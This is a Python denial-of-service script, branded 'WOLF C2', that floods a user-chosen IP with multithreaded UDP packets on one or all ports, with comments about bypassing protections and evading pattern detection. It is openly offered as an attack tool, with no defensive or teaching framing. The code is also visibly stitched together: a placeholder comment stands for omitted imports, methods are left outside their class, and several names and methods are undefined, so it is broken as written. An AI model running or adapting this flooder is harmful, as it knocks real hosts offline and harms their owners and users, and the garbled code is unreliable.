﻿from socket import socket, AF_INET, SOCK_DGRAM, IPPROTO_UDP
import socket as sock
from threading import Thread, Lock
from random import choices, randint, random
from time import time, sleep
import ctypes
import struct

# [Previous imports and ASCII art remain the same...]

class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force  
        self.threads = threads
        self.sent = 0
        self.total = 0
        self.on = True
        self.lock = Lock()
        
        # Create multiple sockets
        self.sockets = [self.create_socket() for _ in range(min(threads, 100))]
        
        # More varied payload patterns
        self.payloads = [
            str.encode("x" * self.force),
            str.encode("0" * self.force),
            str.encode("\x00" * self.force),
            str.encode("\xff" * self.force)
        ]
        
    def create_socket(self):
        try:
            s = sock.socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
            s.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
            
            # Enable socket options to bypass some basic protections
            try:
                s.setsockopt(sock.SOL_IP, sock.IP_HDRINCL, 1)
                s.setsockopt(sock.SOL_SOCKET, sock.SO_BROADCAST, 1)
            except:
                pass
                
            return s
        except:
            return None

    def flood(self):
        for socket in self.sockets:
            if socket:
                for _ in range(self.threads // len(self.sockets)):
                    Thread(target=self.send, args=(socket,)).start()
        Thread(target=self.info).start()

    def send(self, socket):
        while self.on:
            try:
                payload = choices(self.payloads)[0]
                addr = self._randaddr()
                
                # Randomize source port
                if random() > 0.5:
                    socket.bind(('0.0.0.0', randint(1024, 65535)))
                
                socket.sendto(payload, addr)
                
                with self.lock:
                    self.sent += len(payload)
                    
                # Random delay to avoid easy pattern detection
                if random() > 0.9:
                    sleep(0.01 * random())
                    
            except:
                # Recreate socket if there's an error
                new_socket = self.create_socket()
                if new_socket:
                    socket.close()
                    socket = new_socket
                else:
                    sleep(0.1)


def _randaddr(self):
    return (self.ip, self._randport())

def _randport(self):
    return self.port or randint(1, 65535)


ascii = r'''

 █     █░ ▒█████   ██▓      █████▒
▓█░ █ ░█░▒██▒  ██▒▓██▒    ▓██   ▒ 
▒█░ █ ░█ ▒██░  ██▒▒██░    ▒████ ░ 
░█░ █ ░█ ▒██   ██░▒██░    ░▓█▒  ░ 
░░██▒██▓ ░ ████▓▒░░██████▒░▒█░    
░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒░▓  ░ ▒ ░    
  ▒ ░ ░    ░ ▒ ▒░ ░ ░ ▒  ░ ░      
  ░   ░  ░ ░ ░ ▒    ░ ░    ░ ░    
    ░        ░ ░      ░  ░                                          
                                                        
'''

banner = r"""
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠸⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⢸⠸⠀⡠⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠃⠀⠀⢠⣞⣀⡿⠀⠀⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡖⠁⠀⠀⠀⢸⠈⢈⡇⠀⢀⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠩⢠⡴⠀⠀⠀⠀⠀⠈⡶⠉⠀⠀⡸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠎⢠⣇⠏⠀⠀⠀⠀⠀⠀⠀⠁⠀⢀⠄⡇⠀⠀⠀⠀⠀   
⠀⠀⠀⠀⠀⠀⢠⠏⠀⢸⣿⣴⠀⠀⠀⠀⠀⠀⣆⣀⢾⢟⠴⡇  Aizen⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣿⠀⠠⣄⠸⢹⣦⠀⠀⡄⠀⠀⢋⡟⠀⠀⠁⣇⠀⠀ON⠀⠀⠀    WOLF C2
⠀⠀⠀⠀⢀⡾⠁⢠⠀⣿⠃⠘⢹⣦⢠⣼⠀⠀⠉⠀⠀⠀⠀⢸⡀⠀TOP⠀⠀⠀
⠀⠀⢀⣴⠫⠤⣶⣿⢀⡏⠀⠀⠘⢸⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀
⠐⠿⢿⣿⣤⣴⣿⣣⢾⡄⠀⠀⠀⠀⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀
⠀⠀⠀⣨⣟⡍⠉⠚⠹⣇⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⠀⠀⢀⡀⣾⡇⠀⠀
⠀⠀⢠⠟⣹⣧⠃⠀⠀⢿⢻⡀⢄⠀⠀⠀⠀⠐⣦⡀⣸⣆⠀⣾⣧⣯⢻⠀⠀
⠀⠀⠘⣰⣿⣿⡄⡆⠀⠀⠀⠳⣼⢦⡘⣄⠀⠀⡟⡷⠃⠘⢶⣿⡎⠻⣆⠀⠀
⠀⠀⠀⡟⡿⢿⡿⠀⠀⠀⠀⠀⠙⠀⠻⢯⢷⣼⠁⠁⠀⠀⠀⠙⢿⡄⡈⢆⠀
⠀⠀⠀⠀⡇⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⠀⠀⠀⠀⠀⠀⡇⢹⢿⡀
⠀⠀⠀⠀⠁⠛⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠇⠁
   ⠁⠛⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠇⠁""".replace('▓', '▀')

banner = Add.Add(ascii, banner, center=True)

fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white

blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
purple = Col.StaticMIX((Col.purple, blue, Col.white))
orange = Col.StaticMIX((Col.orange, Col.white))

def init():
  System.Size(140, 40), System.Title(
      ".B.r.u.t.e. .-. .b.y. .S.P.A.R.K.L.E.E.".replace('.', ''))
  Cursor.HideCursor()


init()


def stage(text, symbol='...'):
  col1 = purple
  col2 = white
  return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"


def error(text, start='\n'):
  hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
  exit()


def main():
  print()
  print(
      Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)),
                        Center.XCenter(banner)))

  ip = input(stage(f"Enter the IP to Brutalize {purple}->{fluo2} ", '?'))
  print()

  try:
    if ip.count('.') != 3:
      int('error')
    int(ip.replace('.', ''))
  except:
    error("[Aizen]")

  port = input(
      stage(
          f"\033[38;5;208mPORT \033[35m[{white}press \033[38;5;45menter{white} to launch nukes all port\033[35m] \033[35m->\033[38;5;45m "
          '?'))
  print()

  if port == '':
    port = None
  else:
    try:
      port = int(port)
      if port not in range(1, 65535 + 1):
        int('error')
    except ValueError:
      error("Error! Please enter a correct port.")

  force = input(
      stage(
          f"\033[38;5;208mEvasion \033[35m[{white}press \033[38;5;45menter{white} for 2000\033[35m] \033[35m->\033[38;5;45m "
          '?'))
  print()

  if force == '':
    force = 2000
  else:
    try:
      force = int(force)
    except ValueError:
      error("Error! Please enter an integer.")

  threads = input(
      stage(
          f"\033[38;5;208mThreads \033[35m[{white}press \033[38;5;45menter{white} for 100\033[35m] \033[35m->\033[38;5;45m "
          '?'))
  print()

  if threads == '':
    threads = 100
  else:
    try:
      threads = int(threads)
    except ValueError:
      error("Error! Please enter an integer.")

  print()
  cport = '' if port is None else f'{purple}:{fluo2}{port}'
  print(stage(f"Attacking... {fluo2}{ip}{cport}{white}."), end='\r')

  brute = Brutalize(ip, port, force, threads)
  try:
    brute.flood()
  except:
    brute.stop()
    error("A fatal error has occured and the attack was stopped.", '')
  try:
    while True:
      sleep(1000000)
  except KeyboardInterrupt:
    brute.stop()
    print(
        stage(
            f"{orange}Stopped. {fluo2}{ip}{cport}{white} was Diddled With {fluo}{round(brute.total, 1)} {white}GB."
            '.'))
  print('\n')
  sleep(1)

  hinput(stage(f"Press {fluo2}enter{white} to {fluo}exit{white}.", '.'))


if __name__ == '__main__':
  main()